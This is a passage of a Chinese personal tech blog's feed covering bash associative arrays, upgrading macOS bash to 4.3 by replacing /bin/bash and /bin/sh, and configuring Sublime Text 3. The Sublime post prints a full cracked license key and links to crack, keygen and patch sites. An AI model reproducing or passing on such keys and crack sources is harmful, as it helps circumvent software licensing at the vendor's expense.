class="built_in">echo</span> -e <span class="string">&#x27;数组值$&#123;arr[C]&#125;:\t&#x27;</span><span class="variable">$&#123;arr[C]&#125;</span>;</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;数组值(大小写敏感)$&#123;arr[c]&#125;:\t&#x27;</span><span class="variable">$&#123;arr[c]&#125;</span>;</span><br></pre></td></tr></table></figure><h3 id="2-实例输出"><a href="#2-实例输出" class="headerlink" title="2. 实例输出"></a>2. 实例输出</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">数组长度<span class="variable">$&#123;#arr[@]&#125;</span>:5</span><br><span class="line">数组长度<span class="variable">$&#123;#arr[@]:1:4&#125;</span>:5</span><br><span class="line">单个元素长度<span class="variable">$&#123;#arr[C]&#125;</span>:2</span><br><span class="line">单个元素长度<span class="variable">$&#123;#arr[B]&#125;</span>:4</span><br><span class="line"></span><br><span class="line">数组索引<span class="variable">$&#123;!arr[@]&#125;</span>:A B C E b</span><br><span class="line">全部数组内容<span class="variable">$&#123;arr[@]&#125;</span>:A1 B411 C2 E3 b5</span><br><span class="line"></span><br><span class="line">数组子串<span class="variable">$&#123;arr[@]:2&#125;</span>:B411 C2 E3 b5</span><br><span class="line">数组子串<span class="variable">$&#123;arr[@]:1:4&#125;</span>:A1 B411 C2 E3</span><br><span class="line"></span><br><span class="line">数组值<span class="variable">$&#123;arr[b]&#125;</span>:b5</span><br><span class="line">数组值<span class="variable">$&#123;arr[C]&#125;</span>:C2</span><br><span class="line">数组值(大小写敏感)<span class="variable">$&#123;arr[c]&#125;</span>:</span><br></pre></td></tr></table></figure><h2 id="三、附加知识"><a href="#三、附加知识" class="headerlink" title="三、附加知识"></a>三、附加知识</h2><h3 id="1-内部域分隔符IFS"><a href="#1-内部域分隔符IFS" class="headerlink" title="1. 内部域分隔符IFS"></a>1. 内部域分隔符IFS</h3><p>shell里默认使用空格、制表符以及换行为分隔符。</p><h3 id="2-数组转换"><a href="#2-数组转换" class="headerlink" title="2. 数组转换"></a>2. 数组转换</h3><p>字符串可通过()默认通过IFS将字符串直接转换成数组。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:tmp yeshaoting$ str=<span class="string">&quot;1 3 2 7 5&quot;</span></span><br><span class="line">yerba-buena:tmp yeshaoting$ arr=(<span class="variable">$str</span>)</span><br><span class="line">yerba-buena:tmp yeshaoting$ <span class="built_in">echo</span> <span class="variable">$&#123;arr[@]&#125;</span></span><br><span class="line">1 3 2 7 5</span><br><span class="line">yerba-buena:tmp yeshaoting$ <span class="built_in">echo</span> <span class="variable">$&#123;!arr[@]&#125;</span></span><br><span class="line">0 1 2 3 4</span><br></pre></td></tr></table></figure><h3 id="3-数组键大小写敏感"><a href="#3-数组键大小写敏感" class="headerlink" title="3. 数组键大小写敏感"></a>3. 数组键大小写敏感</h3><p><code>$&#123;arr[C]&#125;</code>取值为C2，<code>$&#123;arr[c]&#125;</code>则为空。<br>另外，键加不加引号都一样，引号可用于拼接键值操作。</p><h3 id="4-关联数组键有序"><a href="#4-关联数组键有序" class="headerlink" title="4. 关联数组键有序"></a>4. 关联数组键有序</h3><p>关联数组依键有序，与插入数组顺序无关。如上例中数组输出结果为：A1 B411 C2 E3 b5。</p><h3 id="5-索引负值"><a href="#5-索引负值" class="headerlink" title="5. 索引负值"></a>5. 索引负值</h3><p>数组索引负值表示从数组末尾输出。其中，-1表示数组最后一个元素，-max_num-1表示数组第一个元素。<br>如果索引值index&lt;-max_num-1，则会报“数组下标不正确”的异常。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)</span><br><span class="line">yerba-buena:tmp yeshaoting$ <span class="built_in">echo</span> <span class="variable">$&#123;arr[-1]&#125;</span></span><br><span class="line">5</span><br><span class="line">yerba-buena:tmp yeshaoting$ <span class="built_in">echo</span> <span class="variable">$&#123;arr[-5]&#125;</span></span><br><span class="line">1</span><br><span class="line">yerba-buena:tmp yeshaoting$ <span class="built_in">echo</span> <span class="variable">$&#123;arr[-6]&#125;</span></span><br><span class="line">-bash: arr: 数组下标不正确</span><br></pre></td></tr></table></figure><h3 id="6-索引超过数组最大个数"><a href="#6-索引超过数组最大个数" class="headerlink" title="6. 索引超过数组最大个数"></a>6. 索引超过数组最大个数</h3><p>不输出任何内容，也不会报错。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)</span><br><span class="line">yerba-buena:tmp yeshaoting$ <span class="built_in">echo</span> <span class="variable">$&#123;arr[6]&#125;</span></span><br></pre></td></tr></table></figure><h2 id="四、参考文档"><a href="#四、参考文档" class="headerlink" title="四、参考文档"></a>四、参考文档</h2><ol><li><a href="http://salogs.com/news/2015/08/02/shell-array-demo/">shell 数组应用实例</a></li><li><a href="http://www.1987.name/164.html">[Shell学习笔记] 数组、关联数组和别名使用</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/bash.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：bash自版本4后才开始支持关联数组，之前的版本可以考虑通过二维数组来代替。&lt;/p&gt;
&lt;h2 id=&quot;一、基本用法&quot;&gt;&lt;a href=&quot;#一、基本用法&quot; class=&quot;headerlink&quot; title=&quot;一、基本用法&quot;&gt;&lt;/a&gt;一、基本用法&lt;/h2&gt;&lt;h3 id=&quot;1-数组声明&quot;&gt;&lt;a href=&quot;#1-数组声明&quot; class=&quot;headerlink&quot; title=&quot;1. 数组声明&quot;&gt;&lt;/a&gt;1. 数组声明&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;declare&lt;/span&gt; -a arr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h3 id=&quot;2-数组赋值&quot;&gt;&lt;a href=&quot;#2-数组赋值&quot; class=&quot;headerlink&quot; title=&quot;2. 数组赋值&quot;&gt;&lt;/a&gt;2. 数组赋值&lt;/h3&gt;&lt;h4 id=&quot;静态赋值&quot;&gt;&lt;a href=&quot;#静态赋值&quot; class=&quot;headerlink&quot; title=&quot;静态赋值&quot;&gt;&lt;/a&gt;静态赋值&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;arr=([A]=A1, [C]=C2, [E]=E3, [B]=B411, [b]=b5)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&quot;动态赋值&quot;&gt;&lt;a href=&quot;#动态赋值&quot; class=&quot;headerlink&quot; title=&quot;动态赋值&quot;&gt;&lt;/a&gt;动态赋值&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;arr[&lt;span class=&quot;string&quot;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;]=A1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;arr[&lt;span class=&quot;string&quot;&gt;&amp;quot;C&amp;quot;&lt;/span&gt;]=C2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;arr[&lt;span class=&quot;string&quot;&gt;&amp;quot;E&amp;quot;&lt;/span&gt;]=E3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;arr[&lt;span class=&quot;string&quot;&gt;&amp;quot;B&amp;quot;&lt;/span&gt;]=B411&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;arr[&lt;span class=&quot;string&quot;&gt;&amp;quot;b&amp;quot;&lt;/span&gt;]=b5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h3 id=&quot;3-数组遍历&quot;&gt;&lt;a href=&quot;#3-数组遍历&quot; class=&quot;headerlink&quot; title=&quot;3. 数组遍历&quot;&gt;&lt;/a&gt;3. 数组遍历&lt;/h3&gt;&lt;h4 id=&quot;数组索引-键&quot;&gt;&lt;a href=&quot;#数组索引-键&quot; class=&quot;headerlink&quot; title=&quot;数组索引(键)&quot;&gt;&lt;/a&gt;数组索引(键)&lt;/h4&gt;&lt;p&gt;格式：&lt;code&gt;$&amp;#123;!arr[@]&amp;#125;&lt;/code&gt; 或 &lt;code&gt;$&amp;#123;!arr[*]&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;数组内容-值&quot;&gt;&lt;a href=&quot;#数组内容-值&quot; class=&quot;headerlink&quot; title=&quot;数组内容(值)&quot;&gt;&lt;/a&gt;数组内容(值)&lt;/h4&gt;&lt;p&gt;格式：&lt;code&gt;$&amp;#123;arr[@]&amp;#125;&lt;/code&gt; 或 &lt;code&gt;$&amp;#123;arr[*]&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;4-数组长度&quot;&gt;&lt;a href=&quot;#4-数组长度&quot; class=&quot;headerlink&quot; title=&quot;4. 数组长度&quot;&gt;&lt;/a&gt;4. 数组长度&lt;/h3&gt;&lt;p&gt;格式：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$&amp;#123;#变量&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;该变量若为数组，则为数组长度；若为普通变量，则为普通变量长度。&lt;/p&gt;
&lt;p&gt;数组长度：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$&amp;#123;#arr[@]&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$&amp;#123;#arr[*]&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;数组元素长度：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$&amp;#123;#arr[2]&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h3 id=&quot;5-子数组&quot;&gt;&lt;a href=&quot;#5-子数组&quot; class=&quot;headerlink&quot; title=&quot;5. 子数组&quot;&gt;&lt;/a&gt;5. 子数组&lt;/h3&gt;&lt;p&gt;格式：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$&amp;#123;#arr:index:end&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="shell" scheme="http://yeshaoting.cn/tags/shell/"/>
    
    <category term="实践" scheme="http://yeshaoting.cn/tags/%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>升级mac bash到4.3版本</title>
    <link href="http://yeshaoting.cn/article/mac/%E5%8D%87%E7%BA%A7mac%20bash%E5%88%B04.3%E7%89%88%E6%9C%AC/"/>
    <id>http://yeshaoting.cn/article/mac/%E5%8D%87%E7%BA%A7mac%20bash%E5%88%B04.3%E7%89%88%E6%9C%AC/</id>
    <published>2016-01-29T10:52:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/mac.png" class="img-logo img-center" /><h1 id="升级mac-bash到4-3版本"><a href="#升级mac-bash到4-3版本" class="headerlink" title="升级mac bash到4.3版本"></a>升级mac bash到4.3版本</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>MAC OS版本：OS X Yosemite 10.10.5</p><p>经查看bash版本发现，默认的bash版本为：3.2.57(1)-release</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:~ yeshaoting$ /bin/bash -version</span><br><span class="line">GNU bash, version 3.2.57(1)-release (x86_64-apple-darwin14)</span><br><span class="line">Copyright (C) 2007 Free Software Foundation, Inc.</span><br></pre></td></tr></table></figure><h2 id="二、版本升级"><a href="#二、版本升级" class="headerlink" title="二、版本升级"></a>二、版本升级</h2><p>借助mac下的命令行安装工具brew安装bash。</p><h3 id="方式1：brew安装"><a href="#方式1：brew安装" class="headerlink" title="方式1：brew安装"></a>方式1：brew安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:article yeshaoting$ brew install bash</span><br><span class="line">==&gt; Installing dependencies <span class="keyword">for</span> bash: readline</span><br><span class="line">==&gt; Installing bash dependency: readline</span><br><span class="line">==&gt; Downloading https://homebrew.bintray.com/bottles/readline-6.3.8.yosemite.bottle.tar.gz</span><br><span class="line">……</span><br></pre></td></tr></table></figure><h3 id="方式2：自行编译安装"><a href="#方式2：自行编译安装" class="headerlink" title="方式2：自行编译安装"></a>方式2：自行编译安装</h3><p>bash下载地址：<a href="http://ftp.gnu.org/gnu/bash/">http://ftp.gnu.org/gnu/bash/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.gnu.org/gnu/bash/bash-4.2.tar.gz</span><br><span class="line">tar zxvf bash-4.2.tar.gz</span><br><span class="line">cd bash-4.2</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="三、版本替换"><a href="#三、版本替换" class="headerlink" title="三、版本替换"></a>三、版本替换</h2><h3 id="1-替换bash"><a href="#1-替换bash" class="headerlink" title="1. 替换bash"></a>1. 替换bash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/bash.origin</span><br><span class="line">yerba-buena:~ yeshaoting$ sudo ln -s /usr/<span class="built_in">local</span>/opt/bash/bin/bash /bin/bash</span><br></pre></td></tr></table></figure><p>由于本mac版本下的sh并不是直接链接bash，而是bash的一个文件拷贝。因此，还要替换默认的sh指向的命令为bash，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:~ yeshaoting$ sudo mv /bin/sh /bin/sh.origin</span><br><span class="line">yerba-buena:~ yeshaoting$ sudo ln -s /usr/<span class="built_in">local</span>/opt/bash/bin/bash /bin/sh</span><br></pre></td></tr></table></figure><h3 id="2-验证"><a href="#2-验证" class="headerlink" title="2. 验证"></a>2. 验证</h3><p>通过bash和sh命令查看版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:~ yeshaoting$ bash -version</span><br><span class="line">GNU bash，版本 4.3.42(1)-release (x86_64-apple-darwin14.5.0)</span><br><span class="line">Copyright (C) 2013 Free Software Foundation, Inc.</span><br><span class="line">许可证 GPLv3+: GNU GPL 许可证第三版或者更新版本 &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line"></span><br><span class="line">This is free software; you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br></pre></td></tr></table></figure><p>通过BASH_VERSION变更查看版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:~ yeshaoting$ <span class="built_in">echo</span> <span class="variable">$BASH_VERSION</span></span><br><span class="line">4.3.42(1)-release</span><br></pre></td></tr></table></figure><h2 id="四、重要特性"><a href="#四、重要特性" class="headerlink" title="四、重要特性"></a>四、重要特性</h2><p>关联数组从bash 4.0开始被引入，关联数组的索引值可以使用任意的文本。</p><h2 id="五、参考文档"><a href="#五、参考文档" class="headerlink" title="五、参考文档"></a>五、参考文档</h2><ol><li><a href="http://zengrong.net/post/1830.htm">升级Mountain Lion的bash到4.2版本</a></li><li><a href="http://www.1987.name/164.html">[Shell学习笔记] 数组、关联数组和别名使用</a></li><li><a href="http://www.1987.name/166.html">shell升级，Linux系统升级bash</a></li><li><a href="http://levi.yii.so/archives/4862">MAC系统默认命令行环境BASH版本升级修改</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/mac.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h1 id=&quot;升级mac-bash到4-3版本&quot;&gt;&lt;a href=&quot;#升级mac-bash到4-3版本&quot; class=&quot;header</summary>
      
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="mac" scheme="http://yeshaoting.cn/tags/mac/"/>
    
    <category term="shell" scheme="http://yeshaoting.cn/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>打造个人专属Sublime Text 3</title>
    <link href="http://yeshaoting.cn/article/mac/%E6%89%93%E9%80%A0%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9ESublime%20Text%203/"/>
    <id>http://yeshaoting.cn/article/mac/%E6%89%93%E9%80%A0%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9ESublime%20Text%203/</id>
    <published>2016-01-25T06:28:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/sublime.png" class="img-logo img-center" /><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><h3 id="1-下载与破解"><a href="#1-下载与破解" class="headerlink" title="1. 下载与破解"></a>1. 下载与破解</h3><p>当前可用的破解码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">—– BEGIN LICENSE —–</span><br><span class="line">Andrew Weber</span><br><span class="line">Single User License</span><br><span class="line">EA7E-855605</span><br><span class="line">813A03DD 5E4AD9E6 6C0EEB94 BC99798F</span><br><span class="line">942194A6 02396E98 E62C9979 4BB979FE</span><br><span class="line">91424C9D A45400BF F6747D88 2FB88078</span><br><span class="line">90F5CC94 1CDC92DC 8457107A F151657B</span><br><span class="line">1D22E383 A997F016 42397640 33F41CFC</span><br><span class="line">E1D0AE85 A0BBD039 0E9C8D55 E1B89D5D</span><br><span class="line">5CDB7036 E56DE1C0 EFCC0840 650CD3A6</span><br><span class="line">B98FC99C 8FAC73EE D2B95564 DF450523</span><br><span class="line">—— END LICENSE ——</span><br></pre></td></tr></table></figure><p>参见：</p><ul><li><a href="http://www.xiumu.org/note/sublime-text-3.shtml">Sublime Text 3 破解版 + 注册机 + 汉化包 + 教程</a></li><li><a href="http://www.waitsun.com/sublime-text-3-for-mac.html">Sublime Text 3 for Mac 3075 破解版 – Mac上强大的代码编辑神器</a></li><li><a href="https://www.shuax.com/archives/SublimeText3Crack.html">Sublime Text 3破解补丁</a></li></ul><h3 id="2-Sublime-Text-2与Sublime-Text-3区别"><a href="#2-Sublime-Text-2与Sublime-Text-3区别" class="headerlink" title="2. Sublime Text 2与Sublime Text 3区别"></a>2. Sublime Text 2与Sublime Text 3区别</h3><p>简单的说：</p><ul><li>ST3支持在项目目录里面寻找变量提供了</li><li>对标签页更好地支持（更多的命令和快捷键）</li><li>加快了程序运行的速度</li><li>更新了API，使用Python3.3</li></ul><p>参见：</p><ul><li><a href="https://www.zhihu.com/question/25078353">Sublime Text3与Sublime Text 2的区别在哪里？</a></li><li><a href="http://tutorial.jingwentian.com/Sublime-Text-3-Documentation/porting_guide.html">Sublime Text 3 文档之迁移指南</a></li></ul><h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><h3 id="1-我的配置"><a href="#1-我的配置" class="headerlink" title="1. 我的配置"></a>1. 我的配置</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;ignored_packages&quot;</span>:</span><br><span class="line">[</span><br><span class="line"><span class="string">&quot;Vintage&quot;</span></span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字体</span></span><br><span class="line"><span class="attr">&quot;font_size&quot;</span>: <span class="number">12</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// 高亮当前行</span></span><br><span class="line"><span class="attr">&quot;highlight_line&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新标签页打开文件</span></span><br><span class="line"><span class="attr">&quot;preview_on_click&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">//滚动能否超过结尾</span></span><br><span class="line"><span class="attr">&quot;scroll_past_end&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// TAB缩进宽度</span></span><br><span class="line"><span class="attr">&quot;tab_size&quot;</span>: <span class="number">4</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自动转换TAB为空格</span></span><br><span class="line"><span class="attr">&quot;translate_tabs_to_spaces&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// 皮肤</span></span><br><span class="line"><span class="attr">&quot;theme&quot;</span>: <span class="string">&quot;Soda Dark 3.sublime-theme&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭自动更新</span></span><br><span class="line"><span class="attr">&quot;update_check&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自动换行</span></span><br><span class="line"><span class="attr">&quot;word_wrap&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-关闭自动更新"><a href="#2-关闭自动更新" class="headerlink" title="2. 关闭自动更新"></a>2. 关闭自动更新</h3><p>SublimeText的升级挺快的，每次升级完之后都要重新破解一次主文件，不用重新注册，如果嫌更新太麻烦可以在用户配置中加入如下配置禁用自动更新：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;update_check&quot;</span>: <span class="literal">false</span></span><br></pre></td></tr></table></figure><h3 id="3-soda主题"><a href="#3-soda主题" class="headerlink" title="3. soda主题"></a>3. soda主题</h3><p>参见：<a href="https://github.com/buymeasoda/soda-theme/">https://github.com/buymeasoda/soda-theme/</a></p><p>通过package controller安装Theme - Soda。</p><h3 id="4-记住打开的文件"><a href="#4-记住打开的文件" class="headerlink" title="4. 记住打开的文件"></a>4. 记住打开的文件</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;remember_open_files&quot;</span>: <span class="literal">false</span></span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="5-Sublime-Text-2-使用-Eclipse-快捷键"><a href="#5-Sublime-Text-2-使用-Eclipse-快捷键" class="headerlink" title="5. Sublime Text 2 使用 Eclipse 快捷键"></a>5. Sublime Text 2 使用 Eclipse 快捷键</h3><p><a href="https://gist.github.com/ufologist/5590481#file-package-control-sublime-settings">Sublime Text User Preferences – Eclipse shortcuts for Sublime Text</a><br><a href="http://www.douban.com/note/276794943/">打造属于自己的前端开发神器 – 给Sublime Text加上Eclipse的光环</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 